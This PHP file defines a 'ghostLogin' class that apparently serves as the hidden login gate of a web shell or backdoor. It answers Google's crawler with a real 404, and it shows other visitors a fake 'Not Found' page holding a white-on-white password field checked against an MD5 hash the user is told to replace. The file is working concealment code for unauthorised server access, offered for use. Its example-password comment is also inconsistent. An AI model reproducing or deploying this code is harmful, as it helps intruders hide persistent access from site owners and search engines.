<?php


// example: 
//1.encrypt your password in md5:
//  $mypassword = md5("gloglineasy");  -> password: glogineasy
//  echo $mypassword;  // 59e0dba377e7f3bebf0955ee189538b8
//2.replace default encrypted md5 password
define("MD5PASSWD","59e0dba377e7f3bebf0955ee189538b8");  //passwd md5, change this hash for one yours.

class ghostLogin {

	private $useragent;
	private $myheader;
	private $md5_passwd;
	private $wordcode;

	function __construct(){
		$this->useragent = $_SERVER['HTTP_USER_AGENT'];
		$this->md5_passwd = MD5PASSWD;		
		$this->myheader = 'HTTP/1.0 404 Not Found';
		@session_start();   //session start
	}

	public function showme(){
		
		echo "something";
	}

	private function setSessionName(){
    	$this->wordcode = md5($this->md5_passwd);
	}

	public function getSessionName(){
		return $this->wordcode;
	}

	private function watchG(){
		if( strpos($this->useragent,'Google') !== false ) {
        	header($this->myheader);  
			exit();
  		}
  		else
  			$this->setSessionName();
	}

	private function makeGhostLogin() {
		echo "
			<h1>Not Found</h1>
			<p>The requested URL was not found on this server.</p>
			<hr>
			<address>".$_SERVER['SERVER_SOFTWARE']."  at ".$_SERVER['HTTP_HOST']."</address>
		    <form method=post>
		    <input type=password name=passwd style='margin:0; background-color:#fff; border:1px solid #fff;'>
		    </form></center>";
		exit();
	}

	public function magicVar(){
		$this->watchG();
		if(!isset($_SESSION[$this->getSessionName()]))
			if( empty( $this->md5_passwd ) || ( isset( $_POST['passwd'] ) && ( md5($_POST['passwd']) == $this->md5_passwd )) )
				$_SESSION[$this->getSessionName()] = true;
			else
				$this->makeGhostLogin();
	}
}



?>
